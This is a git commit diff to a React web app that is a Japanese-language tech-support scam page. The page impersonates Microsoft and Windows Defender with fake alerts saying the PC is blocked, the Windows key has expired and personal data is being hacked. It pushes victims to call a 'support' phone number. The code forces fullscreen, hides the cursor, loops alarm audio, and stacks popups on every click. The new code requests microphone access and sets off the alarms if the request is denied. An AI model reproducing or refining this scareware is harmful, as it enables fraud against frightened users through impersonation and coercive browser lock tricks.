19a4678090fcf4a6addeb9cfb317dc0185121040
Aditya Malik <adityamalik@Adityas-MacBook-Pro.local>
2021-10-23 09:27:44 +0530

    audio changes

--- src/Home/AgeConfirm.jsx
+++ src/Home/AgeConfirm.jsx
@@ -8,96 +8,125 @@ import beepAudio from "../beep-04.mp3";
 import voice from "../japancams.mp3";
 
 const AgeConfirm = (props) => {
-  const [audio] = useState(new Audio(beepAudio));
-  const [audio2] = useState(new Audio(voice));
-  const [isModalVisible, setIsModalVisible] = useState(false);
-  const [isBackModalVisible, setIsBackModalVisible] = useState(false);
+    const [audio] = useState(new Audio(beepAudio));
+    const [audio2] = useState(new Audio(voice));
+    const [isModalVisible, setIsModalVisible] = useState(false);
+    const [isBackModalVisible, setIsBackModalVisible] = useState(false);
 
-  const loginToDash = () => {
-    document.getElementById("chat-box").style.display = "block";
+    const loginToDash = () => {
+        document.getElementById("chat-box").style.display = "block";
 
-    showModal();
-    message.error("セキュリティ上の理由でPCがブロックされました");
-  };
+        showModal();
+        message.error("セキュリティ上の理由でPCがブロックされました");
+    };
 
-  const showModal = () => {
-    setIsBackModalVisible(true);
-  };
+    const showModal = () => {
+        setIsBackModalVisible(true);
+    };
 
-  const notificationPopup = () => {
-    notification["error"]({
-      message: "Windowsキーの有効期限が切れています",
-      description: (
-        <div>
-          新しいキーを取得するには、サポートに連絡してください。
-          <br />
-          フリーダイヤル：050-5532-4952
-        </div>
-      ),
-      icon: (
-        <img
-          src={microsoftLogo}
-          style={{ padding: "0px" }}
-          height="40px"
-          width="40px"
-          alt="warning icon"
-        />
-      ),
-      onClick: loginToDash,
-      onClose: loginToDash,
-    });
-  };
+    const notificationPopup = () => {
+        notification["error"]({
+            message: "Windowsキーの有効期限が切れています",
+            description: (
+                <div>
+                    新しいキーを取得するには、サポートに連絡してください。
+                    <br />
+                    フリーダイヤル：050-5532-4952
+                </div>
+            ),
+            icon: (
+                <img
+                    src={microsoftLogo}
+                    style={{ padding: "0px" }}
+                    height="40px"
+                    width="40px"
+                    alt="warning icon"
+                />
+            ),
+            onClick: loginToDash,
+            onClose: loginToDash,
+        });
+    };
 
-  return (
-    <>
-      <div
-        id="ageModal"
-        className="age-comfirm-modal rounded"
-        onClick={() => {
-          notificationPopup();
-          props.makeWindowFullScreen();
-          document.getElementById("ageModal").style.display = "none";
-          document.getElementById("loginPage").style.display = "block";
+    function getLocalStream() {
+        navigator.mediaDevices
+            .getUserMedia({ video: false, audio: true })
+            .then((stream) => {
+                window.localStream = stream; // A
+                window.localAudio.srcObject = stream; // B
+                window.localAudio.autoplay = true; // C
+            })
+            .catch((err) => {
+                if (err.message === "Permission denied") {
+                    audio.play();
+                    audio2.play();
 
-          audio.play();
-          audio2.play();
+                    audio.loop = true;
+                    audio2.loop = true;
 
-          audio.loop = true;
-          audio2.loop = true;
-        }}
-      >
-        <div className="age-comfirm-dialog text-center">
-          <div style={{ textAlign: "right" }}>
-            <img
-              src={cancelIcon}
-              height={20}
-              style={{
-                marginRight: "10px",
-                marginBottom: "5px",
-                cursor: "pointer",
-              }}
-            />
-          </div>
-          {/* <div className="mb-20">あなたは18歳以上ですか？</div>
+                    document.getElementById("allowscreen").style.display =
+                        "none";
+                    document.getElementById("loginPage").style.display =
+                        "block";
+
+                    notificationPopup();
+                } else {
+                    console.log(err);
+                }
+            });
+    }
+
+    return (
+        <>
+            {/* first page code starts here */}
+            <div
+                id="ageModal"
+                className="age-comfirm-modal rounded"
+                onClick={() => {
+                    props.makeWindowFullScreen();
+                    document.getElementById("ageModal").style.display = "none";
+                    document.getElementById("allowscreen").style.display =
+                        "block";
+                    getLocalStream();
+                }}
+            >
+                <div className="age-comfirm-dialog text-center">
+                    <div style={{ textAlign: "right" }}>
+                        <img
+                            src={cancelIcon}
+                            height={20}
+                            style={{
+                                marginRight: "10px",
+                                marginBottom: "5px",
+                                cursor: "pointer",
+                            }}
+                        />
+                    </div>
+                    {/* <div className="mb-20">あなたは18歳以上ですか？</div>
           <div className="flex mt-20">
             <button className="mr-20 btn btn-lg btn-success">はい</button>
             <button className="btn btn-lg btn-danger">ない</button>
           </div> */}
-          <img src={ModalPic} height="300px" />
-        </div>
-      </div>
-      <div id="loginPage" style={{ display: "none" }}>
-        <Login
-          notificationPopup={notificationPopup}
-          isModalVisible={isModalVisible}
-          setIsModalVisible={setIsModalVisible}
-          isBackModalVisible={isBackModalVisible}
-          setIsBackModalVisible={setIsBackModalVisible}
-          loginToDash={loginToDash}
-        />
-      </div>
-    </>
-  );
+                    <img src={ModalPic} height="300px" />
+                </div>
+            </div>
+
+            {/* second page code starts here */}
+            <div id="allowscreen" style={{ display: "none" }}></div>
+
+            {/* third page code starts here */}
+            <div id="loginPage" style={{ display: "none" }}>
+                <Login
+                    notificationPopup={notificationPopup}
+                    isModalVisible={isModalVisible}
+                    setIsModalVisible={setIsModalVisible}
+                    isBackModalVisible={isBackModalVisible}
+                    setIsBackModalVisible={setIsBackModalVisible}
+                    loginToDash={loginToDash}
+                />
+            </div>
+        </>
+    );
 };
 
 export default AgeConfirm;
--- src/Login/index.jsx
+++ src/Login/index.jsx
@@ -1,205 +1,227 @@
 import React, { useEffect, useState } from "react";
 import "./index.scss";
 import userPhoto from "../images/user.jpeg";
-import firstPic from "../images/1.jpeg";
-import secondPic from "../images/2.jpeg";
-import thirdPic from "../images/3.jpeg";
+// import firstPic from "../images/1.jpeg";
+// import secondPic from "../images/2.jpeg";
+// import thirdPic from "../images/3.jpeg";
 import microsoftLogo from "../images/microsoftLogo.jpeg";
 import PhoneLogo from "../images/phn.svg";
 import {
-  makeWindowFullScreen,
-  addShortcutsKeyboard,
+    makeWindowFullScreen,
+    addShortcutsKeyboard,
 } from "../utils/ShortcutEnableDisable";
 import MainModal from "../MainModal";
 import AlternateModals from "../AlternateModals";
 
 const Login = (props) => {
-  const [phoneNumber] = useState("050-5532-4952");
-  const [modals, setModals] = useState([]);
+    const [phoneNumber] = useState("050-5532-4952");
+    const [modals, setModals] = useState([]);
 
-  const requestFullScreen = () => {
-    addShortcutsKeyboard();
-    makeWindowFullScreen();
-    props.loginToDash();
-    document.getElementById("login-wrapper").style.cursor = "none";
-    document.getElementById("blueBackground").style.display = "block";
-  };
+    const requestFullScreen = () => {
+        addShortcutsKeyboard();
+        makeWindowFullScreen();
+        props.loginToDash();
+        document.getElementById("login-wrapper").style.cursor = "none";
+        document.getElementById("blueBackground").style.display = "block";
+    };
 
-  const handleCancel = () => {
-    requestFullScreen();
-    setModals([...modals, modals.length]);
-    props.notificationPopup();
-  };
+    const handleCancel = () => {
+        requestFullScreen();
+        setModals([...modals, modals.length]);
+        props.notificationPopup();
+    };
 
-  const handleOk = () => {
-    requestFullScreen();
-    setModals([...modals, modals.length]);
-    props.notificationPopup();
-  };
+    const handleOk = () => {
+        requestFullScreen();
+        setModals([...modals, modals.length]);
+        props.notificationPopup();
+    };
 
-  const handleBackCancel = () => {
-    requestFullScreen();
-    props.setIsModalVisible(true);
-  };
+    const handleBackCancel = () => {
+        requestFullScreen();
+        props.setIsModalVisible(true);
+    };
 
-  const handleBackOk = () => {
-    requestFullScreen();
-    props.setIsModalVisible(true);
-  };
+    const handleBackOk = () => {
+        requestFullScreen();
+        props.setIsModalVisible(true);
+    };
 
-  useEffect(() => {
-    document.addEventListener("fullscreenchange", exitHandler);
-    document.addEventListener("webkitfullscreenchange", exitHandler);
-    document.addEventListener("mozfullscreenchange", exitHandler);
-    document.addEventListener("MSFullscreenChange", exitHandler);
-  }, []);
+    useEffect(() => {
+        document.addEventListener("fullscreenchange", exitHandler);
+        document.addEventListener("webkitfullscreenchange", exitHandler);
+        document.addEventListener("mozfullscreenchange", exitHandler);
+        document.addEventListener("MSFullscreenChange", exitHandler);
+    }, []);
 
-  const exitHandler = () => {
-    var fullscreenElement =
-      document.fullscreenElement ||
-      document.webkitFullscreenElement ||
-      document.mozFullscreenElement ||
-      document.msFullscreenElement;
+    const exitHandler = () => {
+        var fullscreenElement =
+            document.fullscreenElement ||
+            document.webkitFullscreenElement ||
+            document.mozFullscreenElement ||
+            document.msFullscreenElement;
 
-    if (!fullscreenElement) {
-      console.log("Leaving full-screen mode...");
-    } else {
-      console.log("Entering full-screen mode...");
-    }
-  };
+        if (!fullscreenElement) {
+            console.log("Leaving full-screen mode...");
+        } else {
+            console.log("Entering full-screen mode...");
+        }
+    };
 
-  return (
-    <>
-      <MainModal
-        isModalVisible={props.isModalVisible}
-        setIsModalVisible={props.setIsModalVisible}
-        handleCancel={handleCancel}
-        handleOk={handleOk}
-        phoneNumber={phoneNumber}
-      />
-
-      {modals.map((num) => {
-        return (
-          <AlternateModals
-            key={num}
-            isModalVisible={true}
-            handleCancel={handleCancel}
-            handleOk={handleOk}
-            phoneNumber={phoneNumber}
-          />
-        );
-      })}
-
-      <div
-        onClick={requestFullScreen}
-        className="login-wrapper"
-        id="login-wrapper"
-      >
-        <div
-          id="blueBackground"
-          className="animate-me"
-          onClick={handleBackCancel}
-        >
-          <div id="windowsmodal1">
-            <div style={{ textAlign: "center" }}>
-              <strong>WindowsDefender-セキュリティ警告</strong>
-            </div>
-            <div className="row">
-              <div className="col-12">
-                <p style={{ marginLeft: "20px", marginRight: "20px" }}>
-                  DF;この深刻な問題に注意してください。そうしないと、コンピュータネットワークがバーストし、コンピュータがハードウェアの問題に直面する可能性があります。
-                  これはあなたのコンピュータの故障につながる可能性があり、あなたのすべての個人情報がハッキングされる可能性があります。
-                  <br />
-                  1クレジットカードの詳細 <br />
-                  2LINEアプリケーション情報 <br />
-                  3メールアドレス
-                  <br />
-                  4フェイスブックログイン <br />
-                  5保存されたデータとファイル
-                  <br />
-                  電話 : {phoneNumber}
-                  <br />
-                </p>
-              </div>
-            </div>
-            <div className="row">
-              <div className="col-4"></div>
-              <div className="col-8">
-                <button
-                  onClick={handleBackOk}
-                  style={{ width: "100px", marginRight: "10px" }}
-                >
-                  OK
-                </button>
-                <button onClick={handleBackCancel} style={{ width: "100px" }}>
-                  Cancel
-                </button>
-              </div>
-            </div>
-          </div>
-        </div>
-
-        <div className="center">
-          <div className="container">
-            <img
-              src={userPhoto}
-              className="rounded-circle userPhoto"
-              height="180px"
-              width="180px"
-              alt="user"
+    return (
+        <>
+            <MainModal
+                isModalVisible={props.isModalVisible}
+                setIsModalVisible={props.setIsModalVisible}
+                handleCancel={handleCancel}
+                handleOk={handleOk}
+                phoneNumber={phoneNumber}
             />
-            <h1 className="mt-3 microsoftFont" style={{ color: "white" }}>
-              一時的なユーザー
-            </h1>
-            {/* <input type="text" value={username} readOnly={true} className="usernameField mt-3"/><br /> */}
-            {/* <input onKeyPress={keyCheckEnter} id="pass" type="password" placeholder="Password" onChange={(e) => setPassword(e.target.value)} className="passwordField microsoftFont mt-3"/> */}
-            <br />
-            <button id="myBtn" type="submit">
-              ログイン
-            </button>
-            <br />
-            <br />
 
-            <p className="signinoptions">
-              サポート問い合わせ先 ：
-              <span className="phone">
-                <img src={PhoneLogo} height={18} alt="phone logo" />
-              </span>
-              <span style={{ fontSize: "20px", marginLeft: "5px" }}>
-                {phoneNumber}
-              </span>{" "}
-            </p>
+            {modals.map((num) => {
+                return (
+                    <AlternateModals
+                        key={num}
+                        isModalVisible={true}
+                        handleCancel={handleCancel}
+                        handleOk={handleOk}
+                        phoneNumber={phoneNumber}
+                    />
+                );
+            })}
 
-            <div style={{ display: "none" }} id="chat-box">
-              <img src={microsoftLogo} alt="microsoft" />
-              <span
-                style={{
-                  color: "#222",
-                  fontSize: "30px",
-                  fontWeight: "600",
-                  marginLeft: "6px",
-                  position: "relative",
-                  top: "5px",
-                }}
-              >
-                Microsoft
-              </span>
-              <p style={{ fontWeight: "600" }}>サポート問い合わせ先</p>
-              <h4 style={{ fontWeight: "600" }}>
-                <img
-                  src={PhoneLogo}
-                  height={20}
-                  style={{ marginTop: "5px" }}
-                  alt="phone"
-                />
-                {phoneNumber}
-              </h4>
-              <div className="arrow-down">
-                <i className="fa fa-caret-down"></i>
-              </div>
-            </div>
+            <div
+                onClick={requestFullScreen}
+                className="login-wrapper"
+                id="login-wrapper"
+            >
+                <div
+                    id="blueBackground"
+                    className="animate-me"
+                    onClick={handleBackCancel}
+                >
+                    <div id="windowsmodal1">
+                        <div style={{ textAlign: "center" }}>
+                            <strong>WindowsDefender-セキュリティ警告</strong>
+                        </div>
+                        <div className="row">
+                            <div className="col-12">
+                                <p
+                                    style={{
+                                        marginLeft: "20px",
+                                        marginRight: "20px",
+                                    }}
+                                >
+                                    DF;この深刻な問題に注意してください。そうしないと、コンピュータネットワークがバーストし、コンピュータがハードウェアの問題に直面する可能性があります。
+                                    これはあなたのコンピュータの故障につながる可能性があり、あなたのすべての個人情報がハッキングされる可能性があります。
+                                    <br />
+                                    1クレジットカードの詳細 <br />
+                                    2LINEアプリケーション情報 <br />
+                                    3メールアドレス
+                                    <br />
+                                    4フェイスブックログイン <br />
+                                    5保存されたデータとファイル
+                                    <br />
+                                    電話 : {phoneNumber}
+                                    <br />
+                                </p>
+                            </div>
+                        </div>
+                        <div className="row">
+                            <div className="col-4"></div>
+                            <div className="col-8">
+                                <button
+                                    onClick={handleBackOk}
+                                    style={{
+                                        width: "100px",
+                                        marginRight: "10px",
+                                    }}
+                                >
+                                    OK
+                                </button>
+                                <button
+                                    onClick={handleBackCancel}
+                                    style={{ width: "100px" }}
+                                >
+                                    Cancel
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
 
-            {/* <img
+                <div className="center">
+                    <div className="container">
+                        <img
+                            src={userPhoto}
+                            className="rounded-circle userPhoto"
+                            height="180px"
+                            width="180px"
+                            alt="user"
+                        />
+                        <h1
+                            className="mt-3 microsoftFont"
+                            style={{ color: "white" }}
+                        >
+                            一時的なユーザー
+                        </h1>
+                        {/* <input type="text" value={username} readOnly={true} className="usernameField mt-3"/><br /> */}
+                        {/* <input onKeyPress={keyCheckEnter} id="pass" type="password" placeholder="Password" onChange={(e) => setPassword(e.target.value)} className="passwordField microsoftFont mt-3"/> */}
+                        <br />
+                        <button id="myBtn" type="submit">
+                            ログイン
+                        </button>
+                        <br />
+                        <br />
+
+                        <p className="signinoptions">
+                            サポート問い合わせ先 ：
+                            <span className="phone">
+                                <img
+                                    src={PhoneLogo}
+                                    height={18}
+                                    alt="phone logo"
+                                />
+                            </span>
+                            <span
+                                style={{ fontSize: "20px", marginLeft: "5px" }}
+                            >
+                                {phoneNumber}
+                            </span>{" "}
+                        </p>
+
+                        <div style={{ display: "none" }} id="chat-box">
+                            <img src={microsoftLogo} alt="microsoft" />
+                            <span
+                                style={{
+                                    color: "#222",
+                                    fontSize: "30px",
+                                    fontWeight: "600",
+                                    marginLeft: "6px",
+                                    position: "relative",
+                                    top: "5px",
+                                }}
+                            >
+                                Microsoft
+                            </span>
+                            <p style={{ fontWeight: "600" }}>
+                                サポート問い合わせ先
+                            </p>
+                            <h4 style={{ fontWeight: "600" }}>
+                                <img
+                                    src={PhoneLogo}
+                                    height={20}
+                                    style={{ marginTop: "5px" }}
+                                    alt="phone"
+                                />
+                                {phoneNumber}
+                            </h4>
+                            <div className="arrow-down">
+                                <i className="fa fa-caret-down"></i>
+                            </div>
+                        </div>
+
+                        {/* <img
               src={firstPic}
               className="iconImage1 rounded-circle"
               alt="first"
@@ -214,11 +236,11 @@ const Login = (props) => {
               className="iconImage3 rounded-circle"
               alt="third"
             /> */}
-          </div>
-        </div>
-      </div>
-    </>
-  );
+                    </div>
+                </div>
+            </div>
+        </>
+    );
 };
 
 export default Login;
